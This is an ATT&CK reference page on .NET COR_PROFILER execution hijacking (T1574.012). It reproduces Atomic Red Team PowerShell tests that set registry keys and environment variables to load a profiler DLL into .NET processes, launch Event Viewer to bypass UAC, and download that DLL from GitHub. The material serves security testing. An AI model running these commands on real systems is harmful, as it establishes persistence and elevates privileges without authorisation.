
# COR_PROFILER

## Description

### MITRE Description

> Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1574/012

## Potential Commands

```
$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'
$env:COR_PROFILER_PATH = '#{file_name}'
POWERSHELL -c 'Start-Sleep 1'
Write-Host "Creating system environment variables" -ForegroundColor Cyan
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -ForegroundColor Cyan
New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32" -Value #{file_name} -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
START MMC.EXE EVENTVWR.MSC
$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '#{clsid_guid}'
$env:COR_PROFILER_PATH = 'PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll'
POWERSHELL -c 'Start-Sleep 1'
Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll -Force | Out-Null
Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
START MMC.EXE EVENTVWR.MSC
Write-Host "Creating system environment variables" -ForegroundColor Cyan
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll -Force | Out-Null
```

## Commands Dataset

```
[{'command': 'Write-Host "Creating registry keys in '
             'HKCU:Software\\Classes\\CLSID\\#{clsid_guid}" -ForegroundColor '
             'Cyan\n'
             'New-Item -Path '
             '"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32" '
             '-Value PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll '
             '-Force | Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name '
             '"COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | '
             'Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name "COR_PROFILER" '
             '-PropertyType String -Value "#{clsid_guid}" -Force | Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name '
             '"COR_PROFILER_PATH" -PropertyType String -Value '
             'PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll -Force | '
             'Out-Null\n'
             'Write-Host "executing eventvwr.msc" -ForegroundColor Cyan\n'
             'START MMC.EXE EVENTVWR.MSC\n',
  'name': None,
  'source': 'atomics/T1574.012/T1574.012.yaml'},
 {'command': 'Write-Host "Creating registry keys in '
             'HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}" '
             '-ForegroundColor Cyan\n'
             'New-Item -Path '
             '"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32" '
             '-Value #{file_name} -Force | Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name '
             '"COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | '
             'Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name "COR_PROFILER" '
             '-PropertyType String -Value '
             '"{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null\n'
             'New-ItemProperty -Path HKCU:\\Environment -Name '
             '"COR_PROFILER_PATH" -PropertyType String -Value #{file_name} '
             '-Force | Out-Null\n'
             'Write-Host "executing eventvwr.msc" -ForegroundColor Cyan\n'
             'START MMC.EXE EVENTVWR.MSC\n',
  'name': None,
  'source': 'atomics/T1574.012/T1574.012.yaml'},
 {'command': 'Write-Host "Creating system environment variables" '
             '-ForegroundColor Cyan\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" '
             '-PropertyType String -Value "1" -Force | Out-Null\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_PROFILER" -PropertyType String '
             '-Value "#{clsid_guid}" -Force | Out-Null\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_PROFILER_PATH" -PropertyType '
             'String -Value '
             'PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll -Force | '
             'Out-Null\n',
  'name': None,
  'source': 'atomics/T1574.012/T1574.012.yaml'},
 {'command': 'Write-Host "Creating system environment variables" '
             '-ForegroundColor Cyan\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" '
             '-PropertyType String -Value "1" -Force | Out-Null\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_PROFILER" -PropertyType String '
             '-Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | '
             'Out-Null\n'
             'New-ItemProperty -Path '
             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
             'Manager\\Environment\' -Name "COR_PROFILER_PATH" -PropertyType '
             'String -Value #{file_name} -Force | Out-Null\n',
  'name': None,
  'source': 'atomics/T1574.012/T1574.012.yaml'},
 {'command': '$env:COR_ENABLE_PROFILING = 1\n'
             "$env:COR_PROFILER = '#{clsid_guid}'\n"
             '$env:COR_PROFILER_PATH = '
             "'PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll'\n"
             "POWERSHELL -c 'Start-Sleep 1'\n",
  'name': None,
  'source': 'atomics/T1574.012/T1574.012.yaml'},
 {'command': '$env:COR_ENABLE_PROFILING = 1\n'
             "$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'\n"
             "$env:COR_PROFILER_PATH = '#{file_name}'\n"
             "POWERSHELL -c 'Start-Sleep 1'\n",
  'name': None,
  'source': 'atomics/T1574.012/T1574.012.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Hijack Execution Flow: COR_PROFILER': {'atomic_tests': [{'auto_generated_guid': '9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a',
                                                                                   'dependencies': [{'description': '#{file_name} '
                                                                                                                    'must '
                                                                                                                    'be '
                                                                                                                    'present\n',
                                                                                                     'get_prereq_command': 'New-Item '
                                                                                                                           '-Type '
                                                                                                                           'Directory '
                                                                                                                           '(split-path '
                                                                                                                           '#{file_name}) '
                                                                                                                           '-ErrorAction '
                                                                                                                           'ignore '
                                                                                                                           '| '
                                                                                                                           'Out-Null\n'
                                                                                                                           'Invoke-WebRequest '
                                                                                                                           '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" '
                                                                                                                           '-OutFile '
                                                                                                                           '"#{file_name}"\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(Test-Path '
                                                                                                                       '#{file_name}) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'}],
                                                                                   'dependency_executor_name': 'powershell',
                                                                                   'description': 'Creates '
                                                                                                  'user '
                                                                                                  'scope '
                                                                                                  'environment '
                                                                                                  'variables '
                                                                                                  'and '
                                                                                                  'CLSID '
                                                                                                  'COM '
                                                                                                  'object '
                                                                                                  'to '
                                                                                                  'enable '
                                                                                                  'a '
                                                                                                  '.NET '
                                                                                                  'profiler '
                                                                                                  '(COR_PROFILER).\n'
                                                                                                  'The '
                                                                                                  'unmanaged '
                                                                                                  'profiler '
                                                                                                  'DLL '
                                                                                                  '(`T1574.012x64.dll`) '
                                                                                                  'executes '
                                                                                                  'when '
                                                                                                  'the '
                                                                                                  'CLR '
                                                                                                  'is '
                                                                                                  'loaded '
                                                                                                  'by '
                                                                                                  'the '
                                                                                                  'Event '
                                                                                                  'Viewer '
                                                                                                  'process.\n'
                                                                                                  'Additionally, '
                                                                                                  'the '
                                                                                                  'profiling '
                                                                                                  'DLL '
                                                                                                  'will '
                                                                                                  'inherit '
                                                                                                  'the '
                                                                                                  'integrity '
                                                                                                  'level '
                                                                                                  'of '
                                                                                                  'Event '
                                                                                                  'Viewer '
                                                                                                  'bypassing '
                                                                                                  'UAC '
                                                                                                  'and '
                                                                                                  'executing '
                                                                                                  '`notepad.exe` '
                                                                                                  'with '
                                                                                                  'high '
                                                                                                  'integrity.\n'
                                                                                                  'If '
                                                                                                  'the '
                                                                                                  'account '
                                                                                                  'used '
                                                                                                  'is '
                                                                                                  'not '
                                                                                                  'a '
                                                                                                  'local '
                                                                                                  'administrator '
                                                                                                  'the '
                                                                                                  'profiler '
                                                                                                  'DLL '
                                                                                                  'will '
                                                                                                  'still '
                                                                                                  'execute '
                                                                                                  'each '
                                                                                                  'time '
                                                                                                  'the '
                                                                                                  'CLR '
                                                                                                  'is '
                                                                                                  'loaded '
                                                                                                  'by '
                                                                                                  'a '
                                                                                                  'process, '
                                                                                                  'however,\n'
                                                                                                  'the '
                                                                                                  'notepad '
                                                                                                  'process '
                                                                                                  'will '
                                                                                                  'not '
                                                                                                  'execute '
                                                                                                  'with '
                                                                                                  'high '
                                                                                                  'integrity.\n'
                                                                                                  '\n'
                                                                                                  'Reference: '
                                                                                                  'https://redcanary.com/blog/cor_profiler-for-persistence/\n',
                                                                                   'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                   '-Path '
                                                                                                                   '"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}" '
                                                                                                                   '-Recurse '
                                                                                                                   '-Force '
                                                                                                                   '-ErrorAction '
                                                                                                                   'Ignore \n'
                                                                                                                   'Remove-ItemProperty '
                                                                                                                   '-Path '
                                                                                                                   'HKCU:\\Environment '
                                                                                                                   '-Name '
                                                                                                                   '"COR_ENABLE_PROFILING" '
                                                                                                                   '-Force '
                                                                                                                   '-ErrorAction '
                                                                                                                   'Ignore '
                                                                                                                   '| '
                                                                                                                   'Out-Null\n'
                                                                                                                   'Remove-ItemProperty '
                                                                                                                   '-Path '
                                                                                                                   'HKCU:\\Environment '
                                                                                                                   '-Name '
                                                                                                                   '"COR_PROFILER" '
                                                                                                                   '-Force '
                                                                                                                   '-ErrorAction '
                                                                                                                   'Ignore '
                                                                                                                   '| '
                                                                                                                   'Out-Null\n'
                                                                                                                   'Remove-ItemProperty '
                                                                                                                   '-Path '
                                                                                                                   'HKCU:\\Environment '
                                                                                                                   '-Name '
                                                                                                                   '"COR_PROFILER_PATH" '
                                                                                                                   '-Force '
                                                                                                                   '-ErrorAction '
                                                                                                                   'Ignore '
                                                                                                                   '| '
                                                                                                                   'Out-Null\n',
                                                                                                'command': 'Write-Host '
                                                                                                           '"Creating '
                                                                                                           'registry '
                                                                                                           'keys '
                                                                                                           'in '
                                                                                                           'HKCU:Software\\Classes\\CLSID\\#{clsid_guid}" '
                                                                                                           '-ForegroundColor '
                                                                                                           'Cyan\n'
                                                                                                           'New-Item '
                                                                                                           '-Path '
                                                                                                           '"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32" '
                                                                                                           '-Value '
                                                                                                           '#{file_name} '
                                                                                                           '-Force '
                                                                                                           '| '
                                                                                                           'Out-Null\n'
                                                                                                           'New-ItemProperty '
                                                                                                           '-Path '
                                                                                                           'HKCU:\\Environment '
                                                                                                           '-Name '
                                                                                                           '"COR_ENABLE_PROFILING" '
                                                                                                           '-PropertyType '
                                                                                                           'String '
                                                                                                           '-Value '
                                                                                                           '"1" '
                                                                                                           '-Force '
                                                                                                           '| '
                                                                                                           'Out-Null\n'
                                                                                                           'New-ItemProperty '
                                                                                                           '-Path '
                                                                                                           'HKCU:\\Environment '
                                                                                                           '-Name '
                                                                                                           '"COR_PROFILER" '
                                                                                                           '-PropertyType '
                                                                                                           'String '
                                                                                                           '-Value '
                                                                                                           '"#{clsid_guid}" '
                                                                                                           '-Force '
                                                                                                           '| '
                                                                                                           'Out-Null\n'
                                                                                                           'New-ItemProperty '
                                                                                                           '-Path '
                                                                                                           'HKCU:\\Environment '
                                                                                                           '-Name '
                                                                                                           '"COR_PROFILER_PATH" '
                                                                                                           '-PropertyType '
                                                                                                           'String '
                                                                                                           '-Value '
                                                                                                           '#{file_name} '
                                                                                                           '-Force '
                                                                                                           '| '
                                                                                                           'Out-Null\n'
                                                                                                           'Write-Host '
                                                                                                           '"executing '
                                                                                                           'eventvwr.msc" '
                                                                                                           '-ForegroundColor '
                                                                                                           'Cyan\n'
                                                                                                           'START '
                                                                                                           'MMC.EXE '
                                                                                                           'EVENTVWR.MSC\n',
                                                                                                'name': 'powershell'},
                                                                                   'input_arguments': {'clsid_guid': {'default': '{09108e71-974c-4010-89cb-acf471ae9e2c}',
                                                                                                                      'description': 'custom '
                                                                                                                                     'clsid '
                                                                                                                                     'guid',
                                                                                                                      'type': 'String'},
                                                                                                       'file_name': {'default': 'PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll',
                                                                                                                     'description': 'unmanaged '
                                                                                                                                    'profiler '
                                                                                                                                    'DLL',
                                                                                                                     'type': 'Path'}},
                                                                                   'name': 'User '
                                                                                           'scope '
                                                                                           'COR_PROFILER',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': 'f373b482-48c8-4ce4-85ed-d40c8b3f7310',
                                                                                   'dependencies': [{'description': '#{file_name} '
                                                                                                                    'must '
                                                                                                                    'be '
                                                                                                                    'present\n',
                                                                                                     'get_prereq_command': 'New-Item '
                                                                                                                           '-Type '
                                                                                                                           'Directory '
                                                                                                                           '(split-path '
                                                                                                                           '#{file_name}) '
                                                                                                                           '-ErrorAction '
                                                                                                                           'ignore '
                                                                                                                           '| '
                                                                                                                           'Out-Null\n'
                                                                                                                           'Invoke-WebRequest '
                                                                                                                           '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" '
                                                                                                                           '-OutFile '
                                                                                                                           '"#{file_name}"\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(Test-Path '
                                                                                                                       '#{file_name}) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'}],
                                                                                   'dependency_executor_name': 'powershell',
                                                                                   'description': 'Creates '
                                                                                                  'system '
                                                                                                  'scope '
                                                                                                  'environment '
                                                                                                  'variables '
                                                                                                  'to '
                                                                                                  'enable '
                                                                                                  'a '
                                                                                                  '.NET '
                                                                                                  'profiler '
                                                                                                  '(COR_PROFILER). '
                                                                                                  'System '
                                                                                                  'scope '
                                                                                                  'environment '
                                                                                                  'variables '
                                                                                                  'require '
                                                                                                  'a '
                                                                                                  'restart '
                                                                                                  'to '
                                                                                                  'take '
                                                                                                  'effect.\n'
                                                                                                  'The '
                                                                                                  'unmanaged '
                                                                                                  'profiler '
                                                                                                  'DLL '
                                                                                                  '(T1574.012x64.dll`) '
                                                                                                  'executes '
                                                                                                  'when '
                                                                                                  'the '
                                                                                                  'CLR '
                                                                                                  'is '
                                                                                                  'loaded '
                                                                                                  'by '
                                                                                                  'any '
                                                                                                  'process. '
                                                                                                  'Additionally, '
                                                                                                  'the '
                                                                                                  'profiling '
                                                                                                  'DLL '
                                                                                                  'will '
                                                                                                  'inherit '
                                                                                                  'the '
                                                                                                  'integrity\n'
                                                                                                  'level '
                                                                                                  'of '
                                                                                                  'Event '
                                                                                                  'Viewer '
                                                                                                  'bypassing '
                                                                                                  'UAC '
                                                                                                  'and '
                                                                                                  'executing '
                                                                                                  '`notepad.exe` '
                                                                                                  'with '
                                                                                                  'high '
                                                                                                  'integrity. '
                                                                                                  'If '
                                                                                                  'the '
                                                                                                  'account '
                                                                                                  'used '
                                                                                                  'is '
                                                                                                  'not '
                                                                                                  'a '
                                                                                                  'local '
                                                                                                  'administrator '
                                                                                                  'the '
                                                                                                  'profiler '
                                                                                                  'DLL '
                                                                                                  'will\n'
                                                                                                  'still '
                                                                                                  'execute '
                                                                                                  'each '
                                                                                                  'time '
                                                                                                  'the '
                                                                                                  'CLR '
                                                                                                  'is '
                                                                                                  'loaded '
                                                                                                  'by '
                                                                                                  'a '
                                                                                                  'process, '
                                                                                                  'however, '
                                                                                                  'the '
                                                                                                  'notepad '
                                                                                                  'process '
                                                                                                  'will '
                                                                                                  'not '
                                                                                                  'execute '
                                                                                                  'with '
                                                                                                  'high '
                                                                                                  'integrity.\n'
                                                                                                  '\n'
                                                                                                  'Reference: '
                                                                                                  'https://redcanary.com/blog/cor_profiler-for-persistence/\n',
                                                                                   'executor': {'cleanup_command': 'Remove-ItemProperty '
                                                                                                                   '-Path '
                                                                                                                   "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                                   "Manager\\Environment' "
                                                                                                                   '-Name '
                                                                                                                   '"COR_ENABLE_PROFILING" '
                                                                                                                   '-Force '
                                                                                                                   '-ErrorAction '
                                                                                                                   'Ignore '
                                                                                                                   '| '
                                                                                                                   'Out-Null\n'
                                                                                                                   'Remove-ItemProperty '
                                                                                                                   '-Path '
                                                                                                                   "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                                   "Manager\\Environment' "
                                                                                                                   '-Name '
                                                                                                                   '"COR_PROFILER" '
                                                                                                                   '-Force '
                                                                                                                   '-ErrorAction '
                                                                                                                   'Ignore '
                                                                                                                   '| '
                                                                                                                   'Out-Null\n'
                                                                                                                   'Remove-ItemProperty '
                                                                                                                   '-Path '
                                                                                                                   "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                                   "Manager\\Environment' "
                                                                                                                   '-Name '
                                                                                                                   '"COR_PROFILER_PATH" '
                                                                                                                   '-Force '
                                                                                                                   '-ErrorAction '
                                                                                                                   'Ignore '
                                                                                                                   '| '
                                                                                                                   'Out-Null\n',
                                                                                                'command': 'Write-Host '
                                                                                                           '"Creating '
                                                                                                           'system '
                                                                                                           'environment '
                                                                                                           'variables" '
                                                                                                           '-ForegroundColor '
                                                                                                           'Cyan\n'
                                                                                                           'New-ItemProperty '
                                                                                                           '-Path '
                                                                                                           "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                           "Manager\\Environment' "
                                                                                                           '-Name '
                                                                                                           '"COR_ENABLE_PROFILING" '
                                                                                                           '-PropertyType '
                                                                                                           'String '
                                                                                                           '-Value '
                                                                                                           '"1" '
                                                                                                           '-Force '
                                                                                                           '| '
                                                                                                           'Out-Null\n'
                                                                                                           'New-ItemProperty '
                                                                                                           '-Path '
                                                                                                           "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                           "Manager\\Environment' "
                                                                                                           '-Name '
                                                                                                           '"COR_PROFILER" '
                                                                                                           '-PropertyType '
                                                                                                           'String '
                                                                                                           '-Value '
                                                                                                           '"#{clsid_guid}" '
                                                                                                           '-Force '
                                                                                                           '| '
                                                                                                           'Out-Null\n'
                                                                                                           'New-ItemProperty '
                                                                                                           '-Path '
                                                                                                           "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                                                                                                           "Manager\\Environment' "
                                                                                                           '-Name '
                                                                                                           '"COR_PROFILER_PATH" '
                                                                                                           '-PropertyType '
                                                                                                           'String '
                                                                                                           '-Value '
                                                                                                           '#{file_name} '
                                                                                                           '-Force '
                                                                                                           '| '
                                                                                                           'Out-Null\n',
                                                                                                'elevation_required': True,
                                                                                                'name': 'powershell'},
                                                                                   'input_arguments': {'clsid_guid': {'default': '{09108e71-974c-4010-89cb-acf471ae9e2c}',
                                                                                                                      'description': 'custom '
                                                                                                                                     'clsid '
                                                                                                                                     'guid',
                                                                                                                      'type': 'String'},
                                                                                                       'file_name': {'default': 'PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll',
                                                                                                                     'description': 'unmanaged '
                                                                                                                                    'profiler '
                                                                                                                                    'DLL',
                                                                                                                     'type': 'Path'}},
                                                                                   'name': 'System '
                                                                                           'Scope '
                                                                                           'COR_PROFILER',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': '79d57242-bbef-41db-b301-9d01d9f6e817',
                                                                                   'dependencies': [{'description': '#{file_name} '
                                                                                                                    'must '
                                                                                                                    'be '
                                                                                                                    'present\n',
                                                                                                     'get_prereq_command': 'New-Item '
                                                                                                                           '-Type '
                                                                                                                           'Directory '
                                                                                                                           '(split-path '
                                                                                                                           '#{file_name}) '
                                                                                                                           '-ErrorAction '
                                                                                                                           'ignore '
                                                                                                                           '| '
                                                                                                                           'Out-Null\n'
                                                                                                                           'Invoke-WebRequest '
                                                                                                                           '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" '
                                                                                                                           '-OutFile '
                                                                                                                           '"#{file_name}"\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(Test-Path '
                                                                                                                       '#{file_name}) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'}],
                                                                                   'dependency_executor_name': 'powershell',
                                                                                   'description': 'Creates '
                                                                                                  'process '
                                                                                                  'scope '
                                                                                                  'environment '
                                                                                                  'variables '
                                                                                                  'to '
                                                                                                  'enable '
                                                                                                  'a '
                                                                                                  '.NET '
                                                                                                  'profiler '
                                                                                                  '(COR_PROFILER) '
                                                                                                  'without '
                                                                                                  'making '
                                                                                                  'changes '
                                                                                                  'to '
                                                                                                  'the '
                                                                                                  'registry. '
                                                                                                  'The '
                                                                                                  'unmanaged '
                                                                                                  'profiler '
                                                                                                  'DLL '
                                                                                                  '(`T1574.012x64.dll`) '
                                                                                                  'executes '
                                                                                                  'when '
                                                                                                  'the '
                                                                                                  'CLR '
                                                                                                  'is '
                                                                                                  'loaded '
                                                                                                  'by '
                                                                                                  'PowerShell.\n'
                                                                                                  '\n'
                                                                                                  'Reference: '
                                                                                                  'https://redcanary.com/blog/cor_profiler-for-persistence/\n',
                                                                                   'executor': {'cleanup_command': '$env:COR_ENABLE_PROFILING '
                                                                                                                   '= '
                                                                                                                   '0\n'
                                                                                                                   '$env:COR_PROFILER '
                                                                                                                   '= '
                                                                                                                   "''\n"
                                                                                                                   '$env:COR_PROFILER_PATH '
                                                                                                                   '= '
                                                                                                                   "''\n",
                                                                                                'command': '$env:COR_ENABLE_PROFILING '
                                                                                                           '= '
                                                                                                           '1\n'
                                                                                                           '$env:COR_PROFILER '
                                                                                                           '= '
                                                                                                           "'#{clsid_guid}'\n"
                                                                                                           '$env:COR_PROFILER_PATH '
                                                                                                           '= '
                                                                                                           "'#{file_name}'\n"
                                                                                                           'POWERSHELL '
                                                                                                           '-c '
                                                                                                           "'Start-Sleep "
                                                                                                           "1'\n",
                                                                                                'name': 'powershell'},
                                                                                   'input_arguments': {'clsid_guid': {'default': '{09108e71-974c-4010-89cb-acf471ae9e2c}',
                                                                                                                      'description': 'custom '
                                                                                                                                     'clsid '
                                                                                                                                     'guid',
                                                                                                                      'type': 'String'},
                                                                                                       'file_name': {'default': 'PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll',
                                                                                                                     'description': 'unamanged '
                                                                                                                                    'profiler '
                                                                                                                                    'DLL',
                                                                                                                     'type': 'Path'}},
                                                                                   'name': 'Registry-free '
                                                                                           'process '
                                                                                           'scope '
                                                                                           'COR_PROFILER',
                                                                                   'supported_platforms': ['windows']}],
                                                                 'attack_technique': 'T1574.012',
                                                                 'display_name': 'Hijack '
                                                                                 'Execution '
                                                                                 'Flow: '
                                                                                 'COR_PROFILER'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Persistence](../tactics/Persistence.md)
    
* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations


* [User Account Management](../mitigations/User-Account-Management.md)

* [Execution Prevention](../mitigations/Execution-Prevention.md)
    
* [Restrict Registry Permissions](../mitigations/Restrict-Registry-Permissions.md)
    

# Actors


* [Blue Mockingbird](../actors/Blue-Mockingbird.md)

